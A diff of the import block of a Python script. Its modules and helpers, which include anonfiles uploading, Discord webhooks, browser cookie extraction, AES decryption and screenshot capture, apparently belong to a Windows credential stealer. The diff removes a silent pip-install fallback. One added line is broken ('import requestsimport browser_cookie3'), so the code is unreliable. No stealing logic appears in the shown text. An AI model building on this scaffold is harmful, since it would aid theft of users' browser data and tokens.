@@ -11,47 +11,30 @@ from anonFile import uploadToAnonfiles
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
-try:
-    import getpass
-    import os
-    import random
-    import re
-    import shutil
-    import socket
-    import subprocess
-    import threading
-    import dhooks
-    import requests
-    import browser_cookie3
-    from base64 import b64decode
-    from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
-    from json import dumps
-    from json import loads
-    from json import loads as json_loads
-    from sqlite3 import connect as sql_connect
-    from sys import argv, executable
-    from urllib.request import Request, urlopen
-    from zipfile import ZipFile
-    from Crypto.Cipher import AES
-    from PIL import ImageGrab
-    import platform
-except Exception:
-    import subprocess
-    requirements = [
-        "requests",
-        "Pillow",
-        "pycryptodome",
-        "psutil",
-        "WMI",
-        "discord",
-        "dhooks",
-        "browser-cookie3",
-    ]
-    command = " ".join([
-        f"python -m pip install {requirement} &&"
-        for requirement in requirements
-    ])[0:-3]
-    subprocess.run(command, shell=True)
+
+import getpass
+import os
+import random
+import re
+import shutil
+import socket
+import subprocess
+import threading
+import dhooks
+import requestsimport browser_cookie3
+from base64 import b64decode
+from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
+from json import dumps
+from json import loads
+from json import loads as json_loads
+from sqlite3 import connect as sql_connect
+from sys import argv, executable
+from urllib.request import Request, urlopen
+from zipfile import ZipFile
+from Crypto.Cipher import AES
+from PIL import ImageGrab
+import platform
+    
 
 if platform.system() != "Windows":
     exit()
